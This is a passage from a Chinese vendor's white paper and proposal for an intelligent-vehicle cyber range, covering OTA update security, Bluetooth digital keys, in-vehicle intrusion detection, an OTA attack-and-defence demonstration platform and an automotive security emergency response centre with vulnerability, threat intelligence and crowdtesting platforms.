高精度定位计算。</p><p>蓝牙安全通信：提供不同数字钥匙协议所需的蓝牙配对绑定及连接功能，并提供应用层加密功能。同时根据定位计算需求，对车端蓝牙进行配置。</p><p>密码模块：实现包括安全存储，密码服务，密钥管理等在内的安全功能。</p><p>天线模块：根据不同协议进行实现，提供BLE的定位服务。</p><ol><li><p>入侵检测模块参数如下：</p><p>支持网络、主机、CAN总线网络入侵检测及防御；</p><p>各个入侵检测系统检测到安全事件后通过主节点转发至SOC；</p><p>SOC进行事件分析和呈现，并结合漏洞信息判断是否需要更新策略，如需要更新，则在SOC运营管理-规则管理中配置新的策略；</p><p>IDPS管理模块轮询SOC，拉取更新的安全规则，并转发至各个IDPS感知节点。</p></li></ol><h3 id="方案-4"><a href="#方案-4" class="headerlink" title="方案"></a>方案</h3><p>车端软件是指安装在车辆内部电子系统中的软件，它扮演着管理和控制车辆各种功能的重要角色。本方案的车端软件包含以下几个关键功能：OTA升级、蓝牙钥匙和IDPS入侵检测。</p><p>OTA（Over-The-Air）升级是车端软件的一项重要功能。它允许车辆制造商通过无线网络远程更新和升级车辆的软件系统。这种升级方式可以使车辆保持最新的功能和性能，同时修复潜在的安全漏洞和软件缺陷。OTA升级还能够为车辆提供新的功能和服务，提升用户体验，而无需将车辆带到维修中心进行升级；</p><p>蓝牙钥匙是一种通过蓝牙技术实现的无线钥匙系统。车辆的车端软件可以与用户的智能手机或其他蓝牙设备进行通信，将智能手机作为车辆的钥匙使用。用户可以使用手机上的特定应用程序与车辆进行配对和控制，例如远程解锁、启动发动机、调整座椅和温度等。蓝牙钥匙提供了便捷和安全的车辆访问方式，消除了传统钥匙的使用需求。</p><p>IDPS（Intrusion Detection and Prevention System）入侵检测是车辆安全性的重要组成部分。车端软件可以集成IDPS功能，用于监测和识别车辆系统中的潜在入侵行为。它可以检测到未经授权的访问、恶意软件、数据篡改等安全威胁，并采取相应的防御措施，例如发出警报、阻止入侵行为或自动修复受影响的系统。IDPS入侵检测可以提高车辆的安全性和防护能力，保护车辆和乘客的隐私和安全。</p><p>1. 远程升级模块</p><p>远程升级模块的设计与实现将包含以下关键功能：</p><p>升级包下载存储管理：安全地管理升级包的下载、存储和分发，确保数据完整性和一致性。</p><p>升级流程执行：执行详细的升级流程，包括版本检查、升级准备、升级执行和升级后清理等步骤。</p><p>升级包解密和验签：确保升级包的来源可靠、内容未被篡改，使用先进的加密算法和数字签名技术。</p><p>升级包反差分工作：支持差分升级，减少数据传输量，提高升级效率。</p><p>升级状态日志记录与上报：详细记录升级过程中的各种状态和事件，并将重要信息上报至后端服务。</p><p>2. 数字钥匙模块</p><p>数字钥匙模块将实现以下功能：</p><p>多协议支持：支持ICCE及私有协议，确保广泛的兼容性和灵活性。</p><p>基于蓝牙RSSI的定位技术：单模块及多模块定位，提供精确的车辆与用户定位功能。</p><p>近场安全通信能力：确保用户与车辆间的通信安全。</p><p>底层硬件平台独立：软件设计不依赖于特定的硬件平台，以便快速部署至不同车型。</p><p>系统资源开销小：优化整体方案性能，减少系统资源消耗。</p><p>基于ASPICE流程体系开发：确保软件开发过程的可靠性和稳定性。</p><p>3. 车端集成功能</p><p>车端软件将集成以下七大功能：</p><p>认证管理：提供基于不同数字钥匙协议的认证服务，确保身份验证的安全性。</p><p>钥匙管理：全生命周期的钥匙管理服务，支持不同数字钥匙协议的具体应用。</p><p>定位计算：基于BLE的高精度定位计算，提供精确的用户和车辆位置信息。</p><p>蓝牙安全通信：实现蓝牙配对绑定、连接功能和应用层加密，确保通信安全。</p><p>密码模块：包括安全存储、密码服务、密钥管理等安全功能。</p><p>安全芯片：增强安全性，提供硬件级别的保护。</p><p>天线模块：根据不同协议实现，提供BLE定位服务。</p><p>4. 入侵检测模块</p><p>入侵检测模块将提供以下关键功能：</p><p>网络、主机、CAN总线入侵检测及防御：监控车辆内部网络，防止未授权访问和攻击。</p><p>安全事件上报：将检测到的安全事件通过主节点转发至安全运营中心（SOC）。</p><p>事件分析和策略更新：SOC对事件进行分析并决定是否更新策略，新策略将在SOC运营管理中配置。</p><p>IDPS管理模块：轮询SOC，拉取更新的安全规则，并转发至各个IDPS感知节点。</p><h2 id="仿真云平台方案"><a href="#仿真云平台方案" class="headerlink" title="仿真云平台方案"></a>仿真云平台方案</h2><p>功能参数：</p><ol><li>远程升级平台响应见 OTA远程升级攻防演示模块</li><li>数字钥匙平台响应见 数字钥匙攻防演示模块</li><li>车端态势感知平台参数如下：<br>支持与智能汽车网络靶场基础平台中态势分析分系统的集成与适配。</li></ol><ul><li>支持车辆注册。</li><li>支持设备注册。</li><li>支持车辆端流量数据上传。</li><li>支持车辆安全事件上传。</li><li>支持车辆防火墙规则获取。</li><li>支持车辆入侵检测规则获取。</li><li>支持车辆基础配置获取，包括流量上传时间间隔、规则获取时间间隔等。</li><li>支持车辆安全态势总览、安全态势大屏展示。</li></ul><h3 id="方案-5"><a href="#方案-5" class="headerlink" title="方案"></a>方案</h3><ol><li>OTA远程升级平台</li></ol><p>为验证及测试OTA升级管理的安全性，需要为XXXX汽车网络靶场项目搭建一套OTA远程升级攻防演示平台，该平台具备OTA远程升级所需，可用于管理和执行远程设备升级的系统，该平台提供了一个集中化的管理界面，用于上传软件包、创建升级任务、监控升级过程和管理设备。</p><p>演示步骤：</p><p>1.首先在本地搭建OTA升级的管理平台和相关软件，负责存储软件包和管理升级过程，OTA管理平台提供管理界面，用于上传软件包、创建升级任务、监控升级进度等功能。</p><p>2.软件包管理：在OTA管理平台上，您需要准备要升级的软件包。这些软件包应该是经过打包和签名的固件或应用程序版本。</p><p>3.设备注册和身份验证：在OTA管理平台上，您需要为目标设备创建唯一的标识符，并设置设备的注册和身份验证机制。这将确保只有经过授权的设备才能接收和执行升级任务。</p><p>4.升级任务创建：使用OTA管理平台，您可以创建升级任务并指定目标设备。选择要升级的软件包版本，并设置升级计划和策略，如升级时间、优先级等。</p><p>5.升级过程监控：OTA管理平台将提供实时监控功能，用于跟踪升级任务的执行情况。您可以查看目标设备的在线状态、升级进度和日志信息。</p><p>6.远程升级执行：一旦升级任务创建并启动，OTA管理平台将向目标设备发送升级通知。目标设备接收到通知后，会下载并安装升级软件包。您可以在OTA管理平台上查看升级任务的执行情况和结果。</p><ul><li>产品参数介绍</li></ul><ol><li><p>平台支持零件管理功能，按照ECU类型分类管理，该平台实现了零件管理功能，能够根据电子控制单元(ECU)的不同类型进行分类和管理。</p></li><li><p>平台支持车辆、车型管理功能，车辆绑定车型，车型关联ECU信息。可以在平台查看每辆车的所有ECU详细软硬件信息，该平台提供车辆和车型管理功能，允许车辆与特定车型绑定，而车型则关联具体的ECU信息，使得可以在平台上查看每一辆车的所有ECU的详细软硬件信息。</p></li><li><p>平台支持ECU软件版本管理功能，确保每个软件包只能唯一关联到一个ECU，并且每个ECU维护一个唯一的软件版本号。</p></li><li><p>平台支持升级包管理功能。支持用户上传ECU组件软件（如MCU、MPU升级包和配置文件等），并对其进行打包、签名和加密处理，以生成ECU的最终安全升级文件。</p></li><li><p>平台支持差分功能，能够通过比较不同软件版本之间的差异来生成差分升级包，以减少最终升级文件的大小，优化升级过程的效率和速度。</p><p>平台支持升级策略管理。通过升级策略限定每次升级的范围（如：单辆车、小批量、所有车辆等）达到灰度升级的目的。</p></li><li><p>平台支持升级任务管理。包括升级任务创建、升级任务审核、升级任务取消、升级任务执行状态监控等功能。</p><p><strong>升级任务创建</strong>：用户可以在平台上创建新的升级任务，指定所需的ECU目标、相关车型、升级包文件以及升级计划。这些任务可以根据不同车辆的需求和软件版本的兼容性来定制。</p><p><strong>升级任务审核</strong>：为了保证升级任务的准确性和安全性，每个新建的升级任务在执行前需要经过审核流程。审核人员可以检查升级任务的各项参数，确保升级包与目标ECU的匹配性，以及升级时间和策略的合理性。</p><p><strong>升级任务取消</strong>：如果升级任务因为某些原因需要中止，用户可以在平台上取消已创建或已审核的升级任务。取消操作需要根据权限和规则来执行，以防止误操作或非授权取消。</p><p><strong>升级任务执行状态监控</strong>：在升级任务执行的过程中，平台提供实时监控功能，用户可以查看每个升级任务的执行状态、进度条、成功或失败的详细信息。如果在升级过程中遇到问题，监控系统可以帮助快速定位问题，及时采取措施。</p></li><li><p>平台支持日志管理功能。对车辆上传的升级日志信息进行存储、分析处理。</p><p><strong>日志信息存储</strong>：平台自动收集车辆在ECU升级过程中生成的所有日志信息，并将这些信息存储在数据库中。存储的日志包括时间戳、车辆标识、ECU标识、升级包版本、升级状态、错误代码等关键信息。</p><p><strong>日志信息分析</strong>：平台可能提供自动化工具来分析日志数据，识别常见问题和趋势，例如频繁的升级失败、特定ECU的问题或特定车型的升级性能问题。</p></li><li><p>平台支持大数据分析功能。能够对后台收集和产生的海量信息进行深入分析和直观呈现，包括统计车辆总数、监控车辆活跃状态、跟踪车辆ECU软件版本情况以及计算升级任务的执行成功率等关键指标。</p></li><li><p>平台支持多维度的用户、角色、权限管理。能够批量或者单独为用户配置权限，且可以查看用户的操作记录。</p></li><li><p>平台支持TLS双向认证。车辆端与后台之间采用TLS双向认证通信，保证通信数据传输安全，该平台提供了多维度的用户、角色和权限管理功能，允许管理员批量或单独配置用户权限，并能够追踪和查看用户的具体操作记录以确保系统的安全和可审计性。</p></li><li><p>支持OTA缺少升级包校验，升级包篡改导致车辆被刷入恶意升级包；在支持OTA（Over-The-Air）升级的车辆管理平台中，若缺少严格的升级包校验机制，存在安全风险。具体来说，这意味着升级过程中系统未能有效验证升级包的完整性和来源的真实性。在这种情况下，如果升级包在传输过程中被截取并篡改，或者在服务器端被恶意替换，平台可能无法识别这种篡改行为，导致恶意代码或软件被上传并部署到车辆的电子控制单元（ECU）中。</p></li><li><p>支持车机屏幕因恶意升级包被控制，如果车辆管理平台的OTA升级功能缺少严格的升级包校验机制，那么车机系统（Infotainment System）就可能面临被恶意升级包控制的风险；</p></li><li><p>支持车辆与云平台正常升级数据与恶意升级包数据的光电效果显示，车辆与云平台之间正常升级数据与恶意升级包数据的光电效果时，我们可以想象一个用户界面（UI）或者仪表盘上的显示效果，这些效果通常是为了向驾驶员提供视觉反馈。</p></li><li><p>支持OTA云平台存在提权漏洞攻击者利用系统或应用程序中的安全漏洞，从而获得比其当前权限更高级别的访问权。在OTA（Over-The-Air）云平台的背景下，提权漏洞可能允许攻击者执行通常只有系统管理员或有更高权限用户才能进行的操作。</p></li><li><p>支持云平台被夺取后往车辆下发无用升级包；</p><p><strong>入侵</strong>：攻击者可能通过利用已知的安全漏洞、社会工程学、钓鱼攻击或内部人员协助等手段入侵云平台。</p><p><strong>提权</strong>：一旦入侵系统，攻击者通常会寻找提升权限的方法，以便获得管理员级别的访问权限。</p><p><strong>控制OTA更新机制</strong>：攻击者获取了足够的权限后，便可以控制OTA（Over-The-Air）更新机制，包括构建和批准升级包、安排升级时间表等。</p><p><strong>制作无用或恶意升级包</strong>：攻击者可以创建无用的升级包，这些包可能不包含任何实际的更新内容，或者故意构建包含恶意软件的升级包。</p><p><strong>下发升级包</strong>：攻击者可以利用云平台的更新机制，将这些无用或恶意升级包分发到与云平台连接的车辆上。</p></li><li><p>支持大量无用升级包导致车机频繁弹出升级信息无法正常使用，大量无用升级包导致车机系统频繁提示更新，干扰了正常使用并降低了用户体验；</p></li><li><p>支持攻击方与云平台攻击数据光电效果显示。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/1e9ef83a95619fa9ecc701315ae96bf9.png"></p><p>（OTA在线升级管理平台-零部件管理）</p><ol><li>数字钥匙平台方案</li></ol><p>为演示车辆数字钥匙的安全性，本方案搭建一个专门用于测试的环境。下面是搭建测试环境的一般步骤：</p><p>1. 选择测试车辆：选择一辆用于测试的车辆，并确保它符合您的测试需求。可以是一辆实际的车辆或者是一个模拟器。</p><p>2. 搭建车辆通信网络：搭建一个用于车辆通信的网络环境，以模拟车辆与数字钥匙之间的通信。这可以是一个局域网或者是一个专门的测试网络。</p><p>3. 安装数字钥匙系统：根据您要测试的数字钥匙系统的要求，在测试车辆上安装相应的数字钥匙系统。确保数字钥匙系统与车辆的通信正常，并能够进行密钥交换和身份验证。</p><p>4. 创建测试数字钥匙：在测试环境中创建测试用的数字钥匙。为每个测试数字钥匙分配唯一的标识符，并设置相应的密钥和身份验证信息。</p><p>5. 进行安全性测试：根据您的安全测试计划，对数字钥匙系统进行安全性测试。这可以包括身份验证绕过、密钥破解、通信窃听等方面的测试。确保测试过程中的数据和通信都受到适当的保护。</p><p>6. 分析测试结果：分析安全性测试的结果，评估数字钥匙系统的安全性。识别潜在的安全漏洞和风险，并提出改进建议。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/a1e20f3a445c4e3f7b31935a8bd1620f.png"></p><p>（数字钥匙车辆管理界面）</p><ol><li>车端态势感知平台</li></ol><p>车端态势感知平台是指对网络和信息系统的当前状态和威胁进行实时监测、分析和评估的过程。它旨在帮助安全团队了解整个网络环境中的威胁情况，及时发现和应对潜在的安全事件。态势感知平台包含以下几个方面：</p><p>实时监测：车端态势感知平台通过实时监测网络和信息系统的活动，收集、分析和记录大量的安全事件数据。它可以监测网络流量、系统日志、入侵检测系统警报等，以获取关于网络活动和潜在威胁的信息。</p><p>异常检测：车端态势感知平台通过使用机器学习和行为分析技术，检测网络和系统中的异常活动。它可以识别不寻常的登录行为、异常的数据传输、未经授权的访问等，以帮助发现潜在的安全威胁和入侵行为。</p><p>报告和可视化：车端态势感知平台会生成详细的报告和可视化图表，向安全团队和管理层提供关于网络安全态势的实时和历史数据。这些报告和图表可以帮助团队了解威胁的趋势、攻击的来源和目标，以及采取的防御措施的有效性。</p><p>态势感知平台将支持以下能力：</p><p>集成与适配：平台设计支持与智能汽车网络靶场基础平台中态势分析分系统的集成与适配，能够快速接入现有系统，实现数据共享和功能协同。</p><p>车辆注册：支持车辆注册功能，为每一辆车分配唯一的身份标识，确保车辆信息的准确性和安全性。通过身份认证，车辆可以被准确识别并加入态势感知的监控范围。</p><p>设备注册：支持车载设备注册，包括各种传感器、控制单元等，确保所有设备能够被平台识别和管理，为数据采集和事件响应提供基础。</p><p>车辆端流量数据上传：支持车辆端流量数据的实时上传，包括车辆的运行状态、环境信息、用户行为等多维度数据，为态势分析提供丰富的数据源。</p><p>车辆安全事件上传：支持车辆安全事件的实时上传，当车辆检测到异常行为或潜在威胁时，能够及时上报，确保事件得到快速响应和处理。</p><p>车辆防火墙规则获取：支持车辆防火墙规则的获取，平台能够定期下发最新的防火墙规则到车辆，确保车辆的网络环境在最新的安全防护之下。</p><p>车辆入侵检测规则获取：支持车辆入侵检测规则的获取，平台将根据最新的安全威胁情报更新入侵检测规则，并推送至车辆，提高车辆抵御未知威胁的能力。</p><p>车辆基础配置获取：支持车辆基础配置的获取，包括流量上传时间间隔、规则获取时间间隔等，平台能够根据网络状态和安全需求动态调整配置参数，优化车辆的安全性能。</p><p>车辆安全态势总览与大屏展示：支持车辆安全态势总览，通过数据分析和可视化技术，实现安全态势的大屏展示，为管理人员提供直观的安全监控界面，帮助快速理解当前的安全状况，并作出决策。</p><p>通过以上这些态势分析功能和能力，可以帮助安全团队实时了解网络和信息系统的安全状况，及时发现和应对潜在的安全威胁，提高整体的安全性和防护能力。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="posts/0/"/>
      <url>posts/0/</url>
      
        <content type="html"><![CDATA[<p><strong>国利网安智能汽车网络靶场应急响应中心</strong></p><p><strong>技术白皮书</strong></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/7fff6fc96b751b4ab487f682d0a3a2c2.png"></p><p>浙江国利网安科技有限公司</p><p>目 录</p><p>1.1 总体概述 1</p><p>1.2 系统概述 1</p><p>1.3 应急响应中心总体框架 1</p><p>1.3.1 漏洞平台 1</p><p>1.3.2 威胁情报平台 1</p><p>1.3.3 检测平台 2</p><p>1.3.4 安全运营平台 2</p><p>1.3.5 众测活动方案 2</p><p>1.4 文档交付 2</p><p>2 智能汽车网络靶场漏洞管理平台 4</p><p>2.1 总体概述 4</p><p>2.2 漏洞管理平台 5</p><p>2.2.1 资产管理 5</p><p>2.2.2 漏洞采集管理 10</p><p>2.2.3 漏洞运维管理 14</p><p>2.2.4 漏洞风险管理 24</p><p>2.2.5 工单管理 26</p><p>2.2.6 构建漏洞库 29</p><p>2.3 漏洞提交平台（SRC） 33</p><p>2.3.1 多种安全认证方式： 33</p><p>2.3.2 快速漏洞审核： 34</p><p>2.3.3 漏洞奖励计划： 34</p><p>2.3.4 需求评估与授权： 34</p><p>2.3.5 测试人员管理 34</p><p>2.3.6 项目运营管理 39</p><p>2.3.7 项目运维管理 40</p><p>2.3.8 项目流程管理 46</p><p>2.3.9 平台对接 51</p><p>2.4 项目售后管理 53</p><p>2.4.1 漏洞威胁情报及预警服务： 53</p><p>2.4.2 重大漏洞告警及补丁信息： 53</p><p>3 智能汽车网络靶场威胁情报平台 54</p><p>3.1 总体概述 54</p><p>3.2 失陷检测情报 55</p><p>3.2.1 失陷检测情报功能说明 56</p><p>3.3 文件信誉情报 56</p><p>3.3.1 文件信誉情报功能说明 57</p><p>3.4 IP信誉情报 58</p><p>3.4.1 IP信誉情报功能说明 58</p><p>3.5 漏洞情报 58</p><p>3.5.1 漏洞情报功能说明 59</p><p>3.6 APT档案库 59</p><p>3.6.1 APT档案库功能说明 60</p><p>3.7 威胁情报平台技术参数 60</p><p>3.7.1 软件及系统要求 60</p><p>3.7.2 技术参数 60</p><p>3.8 数据更新 96</p><p>3.8.1 数据在线和离线更新 96</p><p>4 智能汽车网络靶场检测平台 96</p><p>4.1 系统概述 96</p><p>4.2 技术架构描述 97</p><p>4.3 功能描述 98</p><p>4.3.1 系统管理 98</p><p>4.3.2 车型管理 99</p><p>4.3.3 计划管理 100</p><p>4.3.4 任务管理 100</p><p>4.3.5 用例管理 101</p><p>4.3.6 结果管理 102</p><p>4.3.7 工具管理 103</p><p>4.3.8 知识库管理 103</p><p>4.3.9 漏洞管理 104</p><p>4.3.10 首页管理 105</p><p>4.3.11 车型测试综合业务管理 106</p><p>4.3.12 全面的文档管理 106</p><p>4.3.13 对外提供测试数据和接入 107</p><p>4.3.14 审计功能 107</p><p>4.3.15 统计功能 107</p><p>4.4 测试能力 108</p><p>4.4.1 标准测试 108</p><p>4.4.2 漏洞检测能力 109</p><p>4.5 测试场景 110</p><p>4.6 功能布局 111</p><p>4.6.1 主页展示功能布局 111</p><p>4.6.2 车型管理功能布局 113</p><p>4.6.3 计划管理功能布局 114</p><p>4.6.4 任务管理功能布局 116</p><p>4.6.5 用例管理功能布局 120</p><p>4.6.6 结果管理功能布局 122</p><p>4.6.7 工具管理功能布局 124</p><p>4.6.8 知识库管理功能布局 125</p><p>4.6.9 漏洞管理功能布局 126</p><p>4.6.10 系统管理功能布局 128</p><p>4.7 平台支持 130</p><p>5 智能汽车网络靶场安全运营平台 131</p><p>5.1 总体概述 131</p><p>5.2 总体技术要求 132</p><p>5.2.1 平台技术要求 132</p><p>5.2.2 安全运营体系建设 133</p><p>5.2.3 功能架构 135</p><p>5.3 能力交付管理 197</p><p>5.3.1 安全运营体系方案 198</p><p>6 智能汽车网络靶场众测活动模块 199</p><p>6.1 总体概述 199</p><p>6.2 测试活动方案 199</p><p>6.3 众测活动规划方案响应 199</p><p>6.4 众测活动招标响应方案 200</p><p>6.4.1 众测活动规划方案 200</p><p>6.4.2 攻防演练活动规划方案 201</p><p>6.4.3 测试分析活动规划方案 202</p><p>6.4.4 联邦互联活动规划方案 203</p><h2 id="总体概述"><a href="#总体概述" class="headerlink" title="总体概述"></a>总体概述</h2><p>针对网络威胁，OEM需要有能力预防、检测和进行快速响应，以减少对车队、企业组织和制造商品牌的损害。为了实现这一目标，智能汽车网络靶场需要为汽车领域定制的连续监测、调查和分析工具，以及经过适当培训的安全分析人员和制定一整套工作流程及平台。</p><p>此外，必须在遵守数据安全/隐私法规的基础上，创建可以监测、汇总和管理大量和不同类型的车队数据，包括个人数据的方法。汽车应急响应中心可提供一个有效的汽车安全操作框架和平台，旨在提供预测、检测和快速响应网络威胁的能力，贯穿车辆的整个生命周期。</p><h2 id="系统概述"><a href="#系统概述" class="headerlink" title="系统概述"></a>系统概述</h2><p>汽车应急响应中心包括漏洞平台、检测平台、威胁情报平台、安全运营平台。</p><p>汽车安全运营平台通过从实验室测试零部件、台架、车辆及已上市车辆的安全日志、安全事件进行收集、依托汽车网络靶场的知识图谱实时威胁检测，并配合应急响应规则，根据不同的威胁等级触发风险预警、开展溯源分析、漏洞验证和策略更新等管控，治理已上市车辆安全问题。</p><p>漏洞提交平台主要用于对接XXXX产品与白帽资源，为产品提供漏洞征集、众测等服务，为白帽提供理想的收益与声望。</p><h2 id="应急响应中心总体框架"><a href="#应急响应中心总体框架" class="headerlink" title="应急响应中心总体框架"></a>应急响应中心总体框架</h2><h3 id="漏洞平台"><a href="#漏洞平台" class="headerlink" title="漏洞平台"></a>漏洞平台</h3><p>漏洞管理平台作为漏洞统一管理的系统，对漏洞生命周期做全面的管理，支持同步靶场平台、汽车安全运营平台、漏洞提交平台（SRC）等平台的漏洞信息。</p><p>SRC平台作为众测活动的基础，旨在招募汽车安全白帽子对XXXX相关车载系统、零部件进行全面漏洞风险评估，并由专业人员进行漏洞管理和白帽子管理。</p><h3 id="威胁情报平台"><a href="#威胁情报平台" class="headerlink" title="威胁情报平台"></a>威胁情报平台</h3><p>威胁情报平台通过安全运营后的威胁情报数据服务，威胁情报数据类型包括：失陷检测类情报、IP信誉情报、文件信誉情报、漏洞情报，本地缓存数亿的海量热点库，提供本地API接口集成，同时提供多源情报汇聚能力。</p><h3 id="检测平台"><a href="#检测平台" class="headerlink" title="检测平台"></a>检测平台</h3><p>安全检测平台的资产数据和漏洞数据与漏洞管理平台和安全运营平台进行同步，安全运营平台对资产的整体安全状态进行展示，漏洞管理平台的数据同步给安全检测平台进行测试验证。</p><h3 id="安全运营平台"><a href="#安全运营平台" class="headerlink" title="安全运营平台"></a>安全运营平台</h3><p>汽车安全运营平台与靶场、威胁情报平台、漏洞管理平台、安全检测平台对接，对其他平台数据、告警和日志信息的归并整合，结合威胁分析模型、安全检测规则，实现对全网XXXX车联网相关安全事件的检测及处置，会同其他平台和运营机制实现事件和漏洞闭环，结合安全大数据、威胁情报实现资产风险的提前感知和预警。</p><h3 id="众测活动方案"><a href="#众测活动方案" class="headerlink" title="众测活动方案"></a>众测活动方案</h3><p>众测活动平台用于发布针对固定产品在固定时间内，进行测评与漏洞提交的模式。众测活动支持活动创建、管理、发布。至少包括众测活动的名称、时间、类型、测试范围、奖励机制等。众测活动模块支持公网域名发布，也支持通过openVPN方式接入访问，保证活动的隐私与安全性。</p><p>提供众测活动的规划方案。包含活动整体安排，活动内容，活动日程，环境搭建，奖励机制，活动组织架构，费用预算等。</p><h2 id="文档交付"><a href="#文档交付" class="headerlink" title="文档交付"></a>文档交付</h2><p>应急响应中心部分交付如下文档：</p><table><thead><tr><th>序号</th><th>系统</th><th>交付物列表</th><th>文档描述</th></tr></thead><tbody><tr><td>1</td><td>智能汽车网络靶场漏洞平台</td><td>《漏洞提交平台及管理平台手册》</td><td>对漏洞提交及管理平台进行使用指导</td></tr><tr><td></td><td></td><td>《系统培训材料》</td><td>对平台使用培训的材料</td></tr><tr><td></td><td></td><td>《漏洞提交平台管理规范》</td><td>对漏洞提交平台进行白帽子管理设计</td></tr><tr><td></td><td></td><td>《漏洞提交平台手册》</td><td>指导客户使用漏洞提交平台</td></tr><tr><td></td><td></td><td>《漏洞提交平台项目提交流程设计》</td><td>对漏洞提交平台进行项目流程管理体系设计</td></tr><tr><td></td><td></td><td>《漏洞提交平台运营方案》</td><td>输出漏洞提交平台搭建后运营方案</td></tr><tr><td></td><td></td><td>《漏洞预警处理报告》</td><td>通过第三方的漏洞信息对比输出漏洞预警报告及处理情况</td></tr><tr><td></td><td></td><td>《漏洞管理平台处置月报》</td><td>对于漏洞处置情况输出月报</td></tr><tr><td></td><td></td><td>《漏洞管理规范》</td><td>指导漏洞运营工作，规范从漏洞预警到漏洞测试、修复与处置、漏洞复测的一系列漏洞运营流程</td></tr><tr><td>2</td><td>智能汽车网络靶场威胁情报平台</td><td>《安全通告月报》</td><td>针对行业内的安全事件进行同步，形成月度报告</td></tr><tr><td></td><td></td><td>《威胁情报平台用户手册》</td><td>威胁情报平台使用指导，能够使客户开展基础操作</td></tr><tr><td></td><td></td><td>《安全通告季度报》</td><td>针对行业内的安全事件进行同步，形成季度报告</td></tr><tr><td></td><td></td><td>《漏洞通告报告》</td><td>紧跟业内动态，收集和整理热点安全漏洞相关信息</td></tr><tr><td>3</td><td>智能汽车网络靶场检测平台</td><td>《检测平台用户手册》</td><td>指导客户对检测平台进行使用</td></tr><tr><td></td><td></td><td>《检测平台培训材料》</td><td>基于平台的培训材料</td></tr><tr><td></td><td></td><td>《项目测试报告》</td><td>对于测试项目进度进行定期报告，频率可以周或月等</td></tr><tr><td></td><td></td><td>《零部件安全风险报告》</td><td>根据测试的零部件情况输出零部件风险报告</td></tr><tr><td>4</td><td>智能汽车网络靶场安全运营中心</td><td>《安全运营平台用户手册》</td><td>指导客户对安全运营平台进行使用</td></tr><tr><td></td><td></td><td>《安全运营平台培训材料》</td><td>基于安全运营平台的培训材料</td></tr><tr><td></td><td></td><td>《汽车安全运营流程体系文档》</td><td>安全事件处置流程及安全运营流程体系</td></tr><tr><td></td><td></td><td>《汽车安全运营方案》</td><td>结合平台功能，设计汽车安全运营体系方案内容，形成可操作、可管理、可监督、可运营、可提升的方案内容</td></tr><tr><td></td><td></td><td>《资产管理月报/季报》</td><td>对全网汽车资产管理及风险情况输出报告，频率可支持每月或每季度</td></tr><tr><td></td><td></td><td>《应急响应预案》</td><td>针对可能出现安全场景提供应急预案内容</td></tr><tr><td></td><td></td><td>《汽车网络安全总结月报》</td><td>结合平台输出汽车安全态势报告，频率根据月度进行提交</td></tr><tr><td></td><td></td><td>《重要时期保障方案》</td><td>提供特殊期间的安全运营及防护方案</td></tr><tr><td></td><td></td><td>《应急响应报告》</td><td>对于出现的事件，进行事件的溯源和整改报告输出</td></tr></tbody></table><h1 id="智能汽车网络靶场漏洞管理平台"><a href="#智能汽车网络靶场漏洞管理平台" class="headerlink" title="智能汽车网络靶场漏洞管理平台"></a>智能汽车网络靶场漏洞管理平台</h1><h2 id="总体概述-1"><a href="#总体概述-1" class="headerlink" title="总体概述"></a>总体概述</h2><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/594c58d3b1d9442ad28298c6b3cb0a22.png"></p><p>漏洞管理平台作为漏洞统一管理的系统，对漏洞生命周期做全面的管理，支持同步靶场平台、汽车安全运营平台、漏洞提交平台（SRC）等平台的漏洞信息。</p><p>SRC平台作为众测活动的基础，旨在招募汽车安全白帽子对XXXX相关车载系统、零部件进行全面漏洞风险评估，并由专业人员进行漏洞管理和白帽子管理。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/83092ad61e5fabed67d0f78149dfa6a4.png" alt="未命名文件 (3)"></p><p>总体架构</p><p>漏洞管理平台的任务是全面管理漏洞的生命周期。这个平台扮演着漏洞信息的集中管理者，能够同步各个重要平台，包括靶场平台、汽车安全运营平台以及漏洞提交平台（SRC）。其核心职责在于确保漏洞在整个生命周期中得到妥善的管理、跟踪和记录。通过与其他平台的集成，它使得漏洞信息的同步和整合成为可能。</p><p>另一方面，SRC平台则是众测活动的核心。其目标是吸引来自汽车安全领域的安全专家，对XXXX相关的车载系统和零部件进行深入的漏洞风险评估。SRC平台由专业人员管理和监督，确保测试人员能够有效地发现和报告漏洞。这个平台在众测项目中起到关键作用，协调测试人员、提供测试资源、管理漏洞报告，以确保项目的安全性和可靠性。</p><h2 id="漏洞管理平台"><a href="#漏洞管理平台" class="headerlink" title="漏洞管理平台"></a>漏洞管理平台</h2><h3 id="资产管理"><a href="#资产管理" class="headerlink" title="资产管理"></a>资产管理</h3><p>资产管理可使用户手动录入各种资产信息，包括IP地址、Web应用、车辆VIN码、车型ID、配置等级、设备序列号、设备型号、设备供应商、移动APP资产、软件供应商（PKI/OTA等）、软硬件版本。这些资产可以按组织结构、业务层次、车型等多个管理层级进行分类、分层、分级管理。</p><p>系统关联了漏洞信息，以便用户查看不同层级分组下的不同类型漏洞，包括汽车漏洞、通用漏洞、事件型漏洞等，并提供漏洞在漏洞库内的编号、漏洞危险程度、对应车辆ID和VIN码。</p><p>资产管理包括了IP资产的管理，用户可以查看各级分组下IP资产的端口、服务、漏洞数量以及POC漏洞数量。对于车辆信息，系统记录了车辆品牌、车型、代、TBOX型号、TBOX供应商名称、车机型号、车机供应商名称等相关数据。此外，系统支持多层级展示资产、漏洞和风险情况，以帮助用户更好地了解和分析资产信息。</p><p>对于车联网相关资产，系统包括了硬件版本、软件版本、零部件编号、投标方信息、IP、ECUID、嵌入式操作系统版本、关联车型等字段记录。而对于移动APP相关资产，系统包括了软件版本、SDK、应用名等字段。这些功能和特点使得资产管理更加灵活和全面，有助于系统管理员更好地了解和掌握资产信息，以及与漏洞管理、风险评估等其他模块的集成和协作。</p><p>功能参数如下：</p><ul><li>支持同步检测平台和其他FAW数据平台资产数据信息，包括资产ID、资产类别、资产系统版本号、供应商信息、序列号等</li><li>支持自定义资产分类和属性，可按需增加资产类型和属性，包括文本框、列表框、数值、密码、IP地址和布尔值</li><li>支持手工录入IP、Web应用、车辆VIN码、车型ID、配置等级、设备（包括TBOX、车机等）序列号、设备型号、设备供应商、移动APP资产、软件供应商（PKI/OTA等）、软硬件版本</li><li>支持资产的分类、分层、分级管理，如以组织机构、业务结构、车型架构等管理层级进